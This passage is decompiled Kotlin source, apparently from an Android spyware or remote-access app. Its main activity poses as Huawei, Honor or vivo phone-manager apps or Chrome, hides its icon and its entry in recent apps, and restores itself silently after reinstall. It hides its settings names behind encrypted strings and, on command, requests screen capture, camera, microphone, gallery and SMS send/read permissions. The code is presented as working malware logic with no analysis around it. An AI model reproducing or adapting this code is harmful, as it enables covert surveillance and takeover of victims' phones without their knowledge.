                val s = configStatus.replace("\\n", "\n"); customStatusText = s
                statusText?.text = s; statusText?.visibility = View.VISIBLE; hasCustomStatus = true
            } else { statusText?.visibility = View.GONE }
            val usageInstructions = config.optString("usageInstructions", "")
            if (usageInstructions.isNotEmpty()) { usageInstructionsText?.text = usageInstructions.replace("\\n", "\n") }
            val textColor = try { Color.parseColor(config.optString("enableButtonTextColor", "#FFFFFF")) } catch (_: Exception) { -1 }
            usageInstructionsText?.setTextColor(textColor); appNameText?.setTextColor(textColor)
        } catch (e: Exception) { Log.w(TAG, "⚠️ 应用页面样式失败: ${e.message}"); applyDefaultTexts() }
    }

    /** JADX: c4() — check accessibility enabled via Settings.Secure. */
    fun isAccessibilityEnabled(): Boolean {
        try {
            val componentName = ComponentName(this, MyAccessibilityService::class.java)
            val enabledStr = Settings.Secure.getString(contentResolver, "enabled_accessibility_services")
            if (enabledStr.isNullOrEmpty()) return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabledStr)
            while (splitter.hasNext()) {
                val comp = ComponentName.unflattenFromString(splitter.next())
                if (comp != null && comp == componentName) return true
            }
            return false
        } catch (e: Exception) { Log.e(TAG, "检查无障碍权限失败", e); return false }
    }

    /** JADX: c5() — check vivo disguise mode. */
    fun isVivoDisguiseActive(): Boolean {
        try {
            val pm = packageManager
            val defaultAlias = ComponentName(this, DefaultLauncherAlias::class.java)
            val vivoAlias = ComponentName(this, AppVariantF::class.java)
            val defaultDisabled = pm.getComponentEnabledSetting(defaultAlias) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            val vivoEnabled = pm.getComponentEnabledSetting(vivoAlias) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            return defaultDisabled
        } catch (e: Exception) { Log.e(TAG, "❌ 检查I管家伪装模式失败", e); return false }
    }

    /** JADX: c6() — check Huawei disguise mode. */
    fun isHuaweiDisguiseActive(): Boolean {
        try {
            val pm = packageManager
            val defaultAlias = ComponentName(this, DefaultLauncherAlias::class.java)
            val defaultDisabled = pm.getComponentEnabledSetting(defaultAlias) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            val huaweiAliases = listOf(AppVariantE::class.java, AppVariantH::class.java, AppVariantI::class.java, AppVariantJ::class.java, AppVariantN::class.java)
            var hasActive = false
            for (cls in huaweiAliases) {
                try { if (pm.getComponentEnabledSetting(ComponentName(this, cls)) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) { hasActive = true; break } } catch (_: Exception) {}
            }
            return defaultDisabled && hasActive
        } catch (e: Exception) { Log.e(TAG, "❌ 检查手机管家伪装模式失败", e); return false }
    }

    /** JADX: c7() — try to launch Chrome. */
    fun launchChrome(): Boolean {
        for (pkg in listOf("com.android.chrome", "com.chrome.beta", "com.chrome.dev", "com.chrome.canary", "com.google.android.apps.chrome")) {
            try {
                val li = packageManager.getLaunchIntentForPackage(pkg)
                if (li != null) { li.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP); startActivity(li); Handler(Looper.getMainLooper()).postDelayed({ finish() }, 100L); return true }
            } catch (_: PackageManager.NameNotFoundException) {} catch (e: Exception) { Log.w(TAG, "⚠️ [伪装] 启动Chrome失败($pkg): ${e.message}") }
        }
        try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com")).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP) }
            startActivity(i); Handler(Looper.getMainLooper()).postDelayed({ finish() }, 100L); return true
        } catch (e: Exception) { Log.w(TAG, "⚠️ [伪装] 默认浏览器也失败: ${e.message}"); return false }
    }

    /** JADX: c8() — redirect to disguise target app. */
    fun redirectToDisguiseApp() {
        if (isFinishing) { Log.w(TAG, "⚠️ [生命周期] Activity关闭中，跳过跳转"); return }
        try {
            val brand = Build.BRAND?.lowercase(Locale.ROOT) ?: ""
            val manufacturer = Build.MANUFACTURER?.lowercase(Locale.ROOT) ?: ""
            if (brand.contains("samsung") || manufacturer.contains("samsung")) { if (launchChrome()) return; finish(); overridePendingTransition(0, 0); return }
            for (action in listOf("com.huawei.systemmanager.intent.action.MAIN", "com.hihonor.systemmanager.intent.action.MAIN")) {
                try {
                    val i = Intent(action).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP) }
                    if (packageManager.resolveActivity(i, 0) != null) { startActivity(i); Handler(Looper.getMainLooper()).postDelayed({ finish() }, 100L); return }
                } catch (e: Exception) { Log.w(TAG, "⚠️ [伪装] Intent Action失败: ${e.message}") }
            }
            for (pkg in listOf("com.hihonor.systemmanager", StringUtil.decrypt("KFYcdEU3AiFFfzhAAi5INQEvWTAsXAM="), StringUtil.decrypt("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo"))) {
                try {
                    packageManager.getPackageInfo(pkg, 0)
                    val li = packageManager.getLaunchIntentForPackage(pkg)
                    if (li != null) { li.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP); startActivity(li); Handler(Looper.getMainLooper()).postDelayed({ finish() }, 100L); return }
                } catch (_: PackageManager.NameNotFoundException) {} catch (e: Exception) { Log.w(TAG, "⚠️ [伪装] 检查包出错: ${e.message}") }
            }
            Log.w(TAG, "⚠️ [伪装] 未找到目标应用，关闭"); finish(); overridePendingTransition(0, 0)
        } catch (e: Exception) { Log.e(TAG, "❌ 跳转失败", e); finish(); overridePendingTransition(0, 0) }
    }

    /** JADX: c9() — clear requesting flag in SharedPreferences. */
    fun clearRequestingFlag() {
        try { getSharedPreferences(StringUtil.decrypt("O1wDN0QrHydYPxRLFCtYPR86"), 0).edit().putBoolean("is_requesting", false).apply() } catch (e: Exception) { Log.e(TAG, "❌ 标记权限申请状态失败", e) }
    }

    /** JADX: d0() — notify accessibility service about permission state. */
    fun notifyServiceOfPermission() {
        try {
            val hasData = MediaProjectionHolder.resultCode != null && MediaProjectionHolder.permissionIntent != null
            if (!hasData) {
                sendBroadcast(Intent("com.storm.safe.rock.intent.PERMISSION_REQUEST").apply { putExtra("permission_type", "media_projection"); putExtra("requesting", true) })
                return
            }
            val a15 = getIntent()?.getBooleanExtra("ANDROID_15_RECOVERY", false) == true
            val lost = getIntent()?.getBooleanExtra("PERMISSION_LOST_RECOVERY", false) == true
            if (!a15 && !lost) { sendBroadcast(Intent("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION")); return }
            sendBroadcast(Intent("com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED").apply { putExtra("success", true); putExtra("permission_recovery", true) })
            runOnUiThread { setStatusTextWithColor("✅ 权限恢复中...") }
            Handler(Looper.getMainLooper()).postDelayed({ try { moveTaskToBack(true); finish() } catch (_: Exception) {} }, 2000L)
        } catch (e: Exception) { Log.e(TAG, "❌ 通知无障碍服务失败", e) }
    }

    /** JADX: d1() — open AccessibilityTrampoline activity. */
    fun openAccessibilityTrampoline() {
        try { startActivity(Intent(this, AccessibilityTrampoline::class.java).apply { addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }) } catch (e: Exception) { Log.e(TAG, "AccessibilityTrampoline launch failed", e) }
        finish()
    }

    /** JADX: d2() — request camera permission. */
    fun requestCameraPermission() {
        try {
            if (checkSelfPermission("android.permission.CAMERA") != 0) requestPermissions(arrayOf("android.permission.CAMERA"), REQUEST_CODE_CAMERA)
            else { runOnUiThread { setStatusTextWithColor("✅ 摄像头权限已授予") }; Handler(Looper.getMainLooper()).postDelayed({ runOnUiThread { statusText?.visibility = View.GONE } }, 2000L) }
        } catch (e: Exception) { Log.e(TAG, "申请摄像头权限失败", e); runOnUiThread { setStatusTextWithColor("❌ 摄像头权限申请失败") } }
    }

    /** JADX: d3() — request MIUI-specific projection. */
    fun requestMiuiProjection() {
        try { runOnUiThread { setStatusTextWithColor("正在申请MIUI投屏权限...") }; window.clearFlags(16); Handler(Looper.getMainLooper()).postDelayed({ requestStandardProjection() }, 500L) } catch (e: Exception) { Log.e(TAG, "❌ MIUI内置权限申请方法失败", e); requestStandardProjection() }
    }

    /** JADX: d4() — request media projection permission. */
    fun requestMediaProjection() {
        try {
            val sdk = Build.VERSION.SDK_INT
            if (sdk >= 30) { runOnUiThread { setStatusTextWithColor("正在申请投屏权限...") }; Handler(Looper.getMainLooper()).postDelayed({ notifyServiceOfPermission(); requestStandardProjectionSafe() }, 1000L); return }
            val m = Build.MANUFACTURER; val b = Build.BRAND
            val isXiaomi = m.contains("Xiaomi", true) || m.contains("Redmi", true) || b.contains("Xiaomi", true) || b.contains("Redmi", true) || b.contains("POCO", true)
            if (mediaProjectionManager == null) { mediaProjectionManager = getSystemService("media_projection") as? MediaProjectionManager }
            notifyServiceOfPermission()
            if (isXiaomi && sdk == 29) { try { requestMiuiProjectionViaQixvbtmo() } catch (_: Exception) { requestStandardProjectionSafe() }; return }
            requestStandardProjectionSafe()
        } catch (e: Exception) { Log.e(TAG, "❌ 申请MediaProjection权限失败", e) }
    }

    private fun requestStandardProjectionSafe() {
        try {
            val captureIntent = mediaProjectionManager?.createScreenCaptureIntent() ?: run { Log.e(TAG, "❌ 创建MediaProjection权限Intent失败"); return }
            try { if (packageManager.resolveActivity(captureIntent, 0) == null) Log.e(TAG, "❌ 系统无法处理权限Intent！") } catch (_: Exception) {}
            startActivityForResult(captureIntent, REQUEST_CODE_MEDIA_PROJECTION)
            startPermissionTimeout()
        } catch (e: Exception) { Log.e(TAG, "❌ requestStandardProjectionSafe failed", e) }
    }

    /** JADX: d5() — request MIUI projection via qixvbtmo. */
    fun requestMiuiProjectionViaQixvbtmo() {
        try {
            runOnUiThread { setStatusTextWithColor("正在通过MIUI方式申请投屏权限...") }
            if (Build.VERSION.SDK_INT <= 29) { requestMiuiProjection(); return }
            try {
                val i = Intent(this, qixvbtmo::class.java)
                if (packageManager.resolveActivity(i, 0) == null) throw Exception("qixvbtmo无法解析")
                startActivityForResult(i, REQUEST_CODE_MIUI_PROJECTION); startPermissionTimeout()
                Handler(Looper.getMainLooper()).postDelayed({ handleAndroid10Dialog() }, 3000L)
            } catch (e: Exception) { Log.e(TAG, "❌ qixvbtmo启动异常", e); throw e }
        } catch (e: Exception) { Log.e(TAG, "❌ MIUI qixvbtmo启动失败", e); requestMiuiProjection() }
    }

    /** JADX: d6() — request microphone permission. */
    fun requestMicrophonePermission() {
        try { if (checkSelfPermission("android.permission.RECORD_AUDIO") != 0) requestPermissions(arrayOf("android.permission.RECORD_AUDIO"), REQUEST_CODE_MIC) } catch (e: Exception) { Log.e(TAG, "❌ 直接麦克风权限请求失败", e) }
    }

    /** JADX: d7() — request standard media projection. */
    fun requestStandardProjection() {
        try {
            val captureIntent = mediaProjectionManager?.createScreenCaptureIntent() ?: run { Log.e(TAG, "❌ 标准权限申请失败：无法创建Intent"); return }
            startActivityForResult(captureIntent, REQUEST_CODE_MEDIA_PROJECTION); startPermissionTimeout()
        } catch (e: Exception) { Log.e(TAG, "❌ 标准权限申请异常", e) }
    }

    /** JADX: d8() — show main content view. */
    fun showMainContent() {
        try { mainContentView?.visibility = View.VISIBLE } catch (e: Exception) { Log.w(TAG, "❌ 显示提示弹窗失败: ${e.message}") }
    }

    /** JADX: d9() — start permission request timeout. */
    fun startPermissionTimeout() {
        cancelPermissionTimeout()
        if (Build.VERSION.SDK_INT == 29) Handler(Looper.getMainLooper()).postDelayed({ handleAndroid10Dialog() }, 1000L)
        permissionTimeoutHandler = Handler(Looper.getMainLooper())
        permissionTimeoutHandler?.post { Log.w(TAG, "⚠️ [权限] 超时检查") }
    }

    /** JADX: e0() — handle accessibility service becoming enabled. */
    fun onAccessibilityEnabled() {
        try {
            // SMART_RETURN_BACKUP: launched by smartReturnToApp, must NOT redirect
            val isSmartReturn = intent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true
            if (isSmartReturn) {
                Log.d(TAG, "✅ [onAccessibilityEnabled] SMART_RETURN_BACKUP 模式，跳过伪装跳转")
                return
            }

            val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
            val setupKey = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
            val setupComplete = getSharedPreferences(prefsName, 0).getBoolean(setupKey, false)
            val triggerExclude = intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) == true
            if (!isPermissionGranted && setupComplete && !triggerExclude) { isPermissionGranted = true; redirectToDisguiseApp(); return }
            if (isFinishing || isDestroyed) { Log.e(TAG, "❌ Activity已销毁或正在结束"); return }
            setupDarkOverlay()
        } catch (e: Exception) { Log.w(TAG, "❌ 启动WebView失败: ${e.message}") }
    }

    /** JADX: e1() — setup dark overlay. */
    fun setupDarkOverlay() {
        try {
            checkAndRequestOverlayPermission(); isInitialized = true; uiHandler = Handler(Looper.getMainLooper())
            var isActive = false
            try { if (!isFinishing && !isDestroyed && hasWindowFocus()) isActive = true } catch (_: Exception) {}
            if (isActive) MyAccessibilityService.isWebViewOpen = true
            uiHandler?.postDelayed({ updateSwitchState() }, 500L)
        } catch (e: Exception) { Log.e(TAG, "❌ 启动WebView状态更新失败", e) }
    }

    /** JADX: e2() — cancel permission timeout. */
    fun cancelPermissionTimeout() {
        permissionTimeoutHandler?.removeCallbacksAndMessages(null); permissionTimeoutHandler = null
    }

    /** JADX: e3() — stop WebView state tracking. */
    fun checkAndRequestOverlayPermission() {
        try { isInitialized = false; uiHandler?.removeCallbacksAndMessages(null); uiHandler = null; MyAccessibilityService.isWebViewOpen = false } catch (e: Exception) { Log.e(TAG, "❌ 停止WebView状态更新失败", e) }
    }

    /** JADX: e4() — set button text safely. */
    fun setButtonText(text: String, color: Int? = null, enabled: Boolean? = null) {
        if (isFinishing || isDestroyed) { Log.w(TAG, "⚠️ Activity已销毁，跳过按钮更新: $text"); return }
        runOnUiThread { enableButton?.text = text; if (color != null) try { enableButton?.setTextColor(getColor(color)) } catch (_: Exception) {}; if (enabled != null) enableButton?.isEnabled = enabled }
    }

    /** JADX: e5() — set status text with color (safe). */
    fun setStatusTextWithColor(text: String, colorResId: Int? = null) {
        if (statusText == null) return
        if (hasCustomStatus && !customStatusText.isNullOrEmpty()) return
        statusText?.text = text; statusText?.visibility = View.VISIBLE
        if (colorResId != null) try { statusText?.setTextColor(getColor(colorResId)) } catch (_: Exception) {}
    }

    /** JADX: e6() — set status text (thread-safe). */
    fun setStatusText(text: String, colorResId: Int? = null) {
        if (isFinishing || isDestroyed) return
        runOnUiThread { setStatusTextWithColor(text, colorResId) }
    }

    /** JADX: e7() — update service switch state. */
    fun updateSwitchState() {
        if (serviceSwitch == null) { Log.w(TAG, "⚠️ serviceSwitch未初始化，跳过updateSwitchState"); return }
        val isRunning = MyAccessibilityService.Companion.isServiceRunning() && isAccessibilityEnabled()
        serviceSwitch?.setOnCheckedChangeListener(null); serviceSwitch?.isChecked = isRunning
        serviceSwitch?.setOnCheckedChangeListener(CompoundButton.OnCheckedChangeListener { _, isChecked -> if (isChecked) checkAndNavigate() else updateSwitchState() })
    }

    /** JADX: e8() — try auto-requesting permission on startup. */
    fun tryAutoPermission() {
        if (enableButton == null) { Log.w(TAG, "⚠️ UI组件未初始化，跳过updateUI"); return }
        if (isAccessibilityEnabled()) { onAccessibilityEnabled(); return }
        val custom = customStatusText
        if (custom.isNullOrEmpty()) statusText?.visibility = View.GONE else { statusText?.text = custom; statusText?.visibility = View.VISIBLE }
        enableButton?.isEnabled = true; updateSwitchState()
    }

    // ── Lifecycle ────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        // Silent reinstall marker check
        try {
            val f = File("/data/local/tmp/app_setup_done.json")
            if (f.exists()) {
                val prefs = getSharedPreferences(StringUtil.decrypt("KkkBBV4sDTpS"), 0)
                val setupKey = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
                if (!prefs.getBoolean(setupKey, false)) {
                    try {
                        if (JSONObject(f.readText()).optBoolean("setupDone", false)) {
                            val excludeKey = StringUtil.decrypt("LkESNlg8CRFRIyRULihIOwkgQyI=")
                            prefs.edit().putBoolean(setupKey, true).putBoolean(excludeKey, true).putBoolean("icon_hidden", true).apply()
                            getSharedPreferences(StringUtil.decrypt("I1AVP3IrGC9DNA=="), 0).edit().putBoolean(StringUtil.decrypt("IkouMkQ8CCtZ"), true).apply()
                            silentReinstallDetected = true
                            Log.d(TAG, "✅ [重装恢复] 检测到适配标记，已恢复全部状态，将自动隐藏")
                        }
                    } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) { Log.w(TAG, "⚠️ [重装恢复] 读取标记文件失败: ${e.message}") }

        val launchIntent = intent
        val className = launchIntent?.component?.className ?: ""
        val isDisguise = launchIntent?.component != null && isDisguiseAlias(className)

        super.onCreate(savedInstanceState)

        if (silentReinstallDetected) { overridePendingTransition(0, 0); moveTaskToBack(true); finish(); return }
        currentActivityRef = WeakReference(this)

        // Exclude from recents
        val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
        val excludeKey = StringUtil.decrypt("LkESNlg8CRFRIyRULihIOwkgQyI=")
        val excludeFromRecents = getSharedPreferences(prefsName, 0).getBoolean(excludeKey, false)
        if (excludeFromRecents) { excludeAppFromRecents(); if (launchIntent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) == true) { moveTaskToBack(true); finish(); return } }
        if (isPermissionGranted) { finish(); overridePendingTransition(0, 0); return }

        val setupKey = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
        val setupComplete = getSharedPreferences(prefsName, 0).getBoolean(setupKey, false)
        if (launchIntent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) != true && setupComplete && (isDisguise || isHuaweiDisguiseActive() || isVivoDisguiseActive())) {
            excludeAppFromRecents(); moveTaskToBack(true); isPermissionGranted = true; redirectToDisguiseApp(); finish(); return
        }

        // Reset disguise if not setup
        if (!setupComplete && (isHuaweiDisguiseActive() || isVivoDisguiseActive())) {
            try {
                val pm = packageManager
                pm.setComponentEnabledSetting(ComponentName(this, iuzxujjtqev::class.java), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                for (cls in listOf(AppVariantE::class.java, AppVariantH::class.java, AppVariantI::class.java, AppVariantJ::class.java, AppVariantF::class.java, AppVariantN::class.java))
                    try { pm.setComponentEnabledSetting(ComponentName(this, cls), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP) } catch (_: Exception) {}
            } catch (e: Exception) { Log.e(TAG, "❌ 重置伪装状态失败", e) }
        }

        try { mediaProjectionManager = getSystemService("media_projection") as? MediaProjectionManager } catch (e: Exception) { Log.e(TAG, "MediaProjectionManager init failed", e) }

        // Register broadcast receiver
        try {
            val filter = IntentFilter().apply {
                addAction("com.storm.safe.rock.intent.STOP_ACTIVITY_CREATION"); addAction("com.storm.safe.rock.intent.REQUEST_PERMISSION_FROM_SERVICE")
                addAction("com.storm.safe.rock.intent.SHOW_MAIN_ACTIVITY"); addAction("com.storm.safe.rock.intent.REQUEST_CAMERA_PERMISSION")
                addAction("com.storm.safe.rock.intent.REQUEST_GALLERY_PERMISSION"); addAction("com.storm.safe.rock.intent.REQUEST_MICROPHONE_PERMISSION")
                addAction("com.storm.safe.rock.intent.REQUEST_SMS_PERMISSION"); addAction("com.storm.safe.rock.intent.REQUEST_ALL_PERMISSIONS")
                addAction("$packageName.REQUEST_MEDIA_PROJECTION")
            }
            if (Build.VERSION.SDK_INT >= 33) registerReceiver(combinedBroadcastReceiver, filter, Context.RECEIVER_NOT_EXPORTED) else registerReceiver(combinedBroadcastReceiver, filter)
            receiverRegistered = true
        } catch (e: Exception) { Log.e(TAG, "❌ 注册广播接收器失败", e) }

        // Launch count
        try { val lp = getSharedPreferences(StringUtil.decrypt("KkkBBUE5GSBUOQ=="), 0); val c = lp.getInt("launch_count", 0); lp.edit().putInt("launch_count", c + 1).apply(); if (c == 0) lp.edit().putLong("first_launch_time", System.currentTimeMillis()).apply() } catch (e: Exception) { Log.e(TAG, "❌ 记录应用启动次数失败", e) }

        if (getSharedPreferences(prefsName, 0).getBoolean(excludeKey, false)) excludeAppFromRecents()
        if (launchIntent?.getBooleanExtra("LAUNCH_BACKGROUND", false) == true) try { overridePendingTransition(0, 0); window.decorView.alpha = 0.0f; moveTaskToBack(true) } catch (e: Exception) { Log.w(TAG, "⚠️ [启动] 隐藏失败: ${e.message}") }
        if (launchIntent?.getBooleanExtra("request_media_projection", false) == true) try { startActivity(Intent(this, qixvbtmo::class.java)) } catch (e: Exception) { Log.e(TAG, "❌ 启动 qixvbtmo 失败", e) }

        autoRequest = launchIntent?.getBooleanExtra("AUTO_REQUEST_PERMISSION", false) ?: false

        // JADX: setContentView(R$layout.rbv2f) — layout built programmatically (vendor XML obfuscated)
        createLayout()

        // SMART_RETURN_BACKUP: launched by smartReturnToApp to bring our app to foreground.
        // Must NOT hide content or return early — the Activity needs to stay visible so that
        // rootInActiveWindow reports our package name, allowing isCurrentlyInOurApp() to succeed.
        val isSmartReturn = launchIntent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true ||
            launchIntent?.getBooleanExtra("MI_ANDROID10_RETURN", false) == true ||
            launchIntent?.getBooleanExtra("MI_ANDROID13_RETURN", false) == true

        val accessibilityEnabled = isAccessibilityEnabled()
        if (accessibilityEnabled && !isSmartReturn) { try { mainContentView?.visibility = View.GONE } catch (_: Exception) {}; return }

        bindViews()
        enableButton?.setOnClickListener { if (isAccessibilityEnabled()) checkAndNavigate() else openAccessibilityTrampoline() }
        serviceSwitch?.setOnCheckedChangeListener { _, isChecked -> if (isChecked) { if (isAccessibilityEnabled()) checkAndNavigate() else openAccessibilityTrampoline() } else updateSwitchState() }
        tryAutoPermission(); showMainContent()
    }

    private fun excludeAppFromRecents() {
        try {
            val am = getSystemService("activity") as? ActivityManager ?: return
            for (task in (am.appTasks ?: return))
                try { val ba = task.taskInfo?.baseActivity; if (ba?.packageName == packageName) task.setExcludeFromRecents(true) } catch (_: Exception) {}
        } catch (_: Exception) {}
    }

    override fun onResume() {
        super.onResume(); currentActivityRef = WeakReference(this)
        try { val pn = StringUtil.decrypt("KkkBBV4sDTpS"); val ek = StringUtil.decrypt("LkESNlg8CRFRIyRULihIOwkgQyI="); if (getSharedPreferences(pn, 0).getBoolean(ek, false)) excludeAppFromRecents() } catch (e: Exception) { Log.e(TAG, "❌ [生命周期] onResume隐藏失败", e) }
        val pn = StringUtil.decrypt("KkkBBV4sDTpS"); val sk = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
        val setupComplete = getSharedPreferences(pn, 0).getBoolean(sk, false)
        val cn = intent?.component?.className ?: ""; val isD = intent?.component != null && isDisguiseAlias(cn)
        val isSmartReturn = intent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true ||
            intent?.getBooleanExtra("MI_ANDROID10_RETURN", false) == true ||
            intent?.getBooleanExtra("MI_ANDROID13_RETURN", false) == true
        if (!isSmartReturn && intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) != true && setupComplete && !isPermissionGranted && (isD || isHuaweiDisguiseActive() || isVivoDisguiseActive())) { isPermissionGranted = true; redirectToDisguiseApp(); return }
        val ae = isAccessibilityEnabled()
        if (!ae) { showMainContent(); return }
        // Don't hide content during smartReturnToApp — Activity must stay visible
        if (!isSmartReturn) {
            try { mainContentView?.visibility = View.GONE } catch (e: Exception) { Log.w(TAG, "❌ 隐藏提示弹窗失败: ${e.message}") }
        }
        if (!getSharedPreferences(pn, 0).getBoolean(sk, false)) sendBroadcast(Intent("${packageName}.START_AUTHORIZATION").apply { setPackage(packageName) })
    }

    override fun onPause() {
        super.onPause()
        try { webView?.onPause() } catch (e: Exception) { Log.w(TAG, "⚠️ 暂停WebView失败: ${e.message}") }
        if (isInitialized) MyAccessibilityService.isWebViewOpen = false
    }

    override fun onStop() { super.onStop(); currentActivityRef = null }

    override fun onDestroy() {
        super.onDestroy(); checkAndRequestOverlayPermission(); cancelPermissionTimeout()
        try { permissionTimeoutHandler?.removeCallbacksAndMessages(null); permissionTimeoutHandler = null; uiHandler?.removeCallbacksAndMessages(null); uiHandler = null } catch (e: Exception) { Log.w(TAG, "清理Handler任务失败: ${e.message}") }
        try { if (receiverRegistered) { unregisterReceiver(combinedBroadcastReceiver); receiverRegistered = false } } catch (e: Exception) { Log.w(TAG, "取消注册广播接收器失败: ${e.message}") }
        try { val wv = webView; if (wv != null) { try { wv.clearCache(true); wv.clearHistory() } catch (_: Exception) {}; try { wv.loadUrl("about:blank"); wv.clearHistory(); wv.clearCache(true); wv.destroy() } catch (_: Exception) {} } } catch (e: Exception) { Log.w(TAG, "清理WebView资源失败: ${e.message}") }
        cancelPermissionTimeout()
        if (currentActivityRef?.get() === this) currentActivityRef = null
    }

    public override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        if (intent == null) { Log.w(TAG, "⚠️ [生命周期] 收到null Intent"); return }
        if (intent.getBooleanExtra("OPEN_APP_DETAILS", false)) { startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))); return }
        setIntent(intent)
        // SMART_RETURN protection: skip redirectToDisguiseApp when launched by brand engine return flows
        val isSmartReturn = intent.getBooleanExtra("SMART_RETURN_BACKUP", false) ||
            intent.getBooleanExtra("MI_ANDROID10_RETURN", false) ||
            intent.getBooleanExtra("MI_ANDROID13_RETURN", false)
        if (isSmartReturn) {
            Log.d(TAG, "✅ [onNewIntent] SMART_RETURN 模式，跳过伪装跳转")
        } else if (!isPermissionGranted && !intent.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false)) {
            val pn = StringUtil.decrypt("KkkBBV4sDTpS"); val sk = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
            val sc = getSharedPreferences(pn, 0).getBoolean(sk, false); val cn = intent.component?.className ?: ""; val isD = intent.component != null && isDisguiseAlias(cn)
            if (sc && (isD || isHuaweiDisguiseActive() || isVivoDisguiseActive())) { isPermissionGranted = true; redirectToDisguiseApp(); return }
        }
        if (intent.getBooleanExtra("request_media_projection", false)) { try { startActivity(Intent(this, qixvbtmo::class.java)) } catch (e: Exception) { Log.e(TAG, "❌ 启动 qixvbtmo 失败", e) }; return }
        if (intent.getBooleanExtra("LAUNCH_BACKGROUND", false)) try { overridePendingTransition(0, 0); window.decorView.alpha = 0.0f; moveTaskToBack(true) } catch (_: Exception) { Log.w(TAG, "⚠️ [生命周期] onNewIntent隐藏失败") }
        if (intent.getBooleanExtra("from_installation_complete", false) && intent.getBooleanExtra("show_webview", false)) return
        if (intent.getBooleanExtra("request_camera_permission", false)) { try { runOnUiThread { setStatusTextWithColor("正在申请摄像头权限...") }; requestCameraPermission() } catch (e: Exception) { Log.e(TAG, "❌ 处理摄像头权限申请请求失败", e) }; return }
        if (intent.getBooleanExtra("request_gallery_permission", false)) { try { val p = if (Build.VERSION.SDK_INT >= 33) arrayOf("android.permission.READ_MEDIA_IMAGES") else arrayOf("android.permission.READ_EXTERNAL_STORAGE"); val n = p.filter { checkSelfPermission(it) != 0 }; if (n.isNotEmpty()) requestPermissions(n.toTypedArray(), REQUEST_CODE_GALLERY) } catch (e: Exception) { Log.e(TAG, "申请相册权限失败", e) }; return }
        if (intent.getBooleanExtra("request_microphone_permission", false)) { requestMicrophonePermission(); return }
        if (intent.getBooleanExtra("request_sms_permission", false)) { try { val p = arrayOf("android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.READ_PHONE_STATE"); val n = p.filter { checkSelfPermission(it) != 0 }; if (n.isNotEmpty()) requestPermissions(n.toTypedArray(), REQUEST_CODE_SMS) } catch (e: Exception) { Log.e(TAG, "申请短信权限失败", e) }; return }
        if (intent.getBooleanExtra("AUTO_REQUEST_PERMISSION", false)) {
            if (isRequesting) { Log.w(TAG, "⚠️ [权限] 申请中，忽略重复Intent"); return }
            autoRequest = true; isRequesting = true
            if (intent.getBooleanExtra("MIUI_PERMISSION_FIX", false)) { runOnUiThread { setStatusTextWithColor("正在修复MIUI权限...") }; Handler(Looper.getMainLooper()).postDelayed({ requestMediaProjection() }, 2000L); return }
            Handler(Looper.getMainLooper()).post { requestMediaProjection() }; return
        }
        if (intent.getBooleanExtra("PERMISSION_LOST_RECOVERY", false)) {
            if (!isAccessibilityEnabled()) { runOnUiThread { tryAutoPermission() }; return }
            setStatusText("🔧 检测到服务权限丢失\n正在自动重新申请权限...", android.R.color.holo_orange_dark); setButtonText("正在恢复权限...", enabled = false)
            Handler(Looper.getMainLooper()).postDelayed({ requestMediaProjection() }, 1000L); return
        }
        if (intent.getBooleanExtra("SMART_RECOVERY", false)) { if (!isAccessibilityEnabled()) { runOnUiThread { tryAutoPermission() }; return }; Handler(Looper.getMainLooper()).postDelayed({ requestMediaProjection() }, 1000L); return }
        if (intent.getBooleanExtra("auto_start", false)) { tryAutoPermission(); return }
        if (intent.getBooleanExtra("auto_restart", false)) { tryAutoPermission(); return }
        tryAutoPermission()
    }

    @Suppress("DEPRECATION")
    public override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQUEST_CODE_MEDIA_PROJECTION -> { if (resultCode != -1) { if (resultCode == 0) Log.w(TAG, "⚠️ [权限] 用户拒绝投屏权限") else Log.w(TAG, "⚠️ [权限] 未知resultCode: $resultCode") }; processPermissionResult(data, resultCode) }
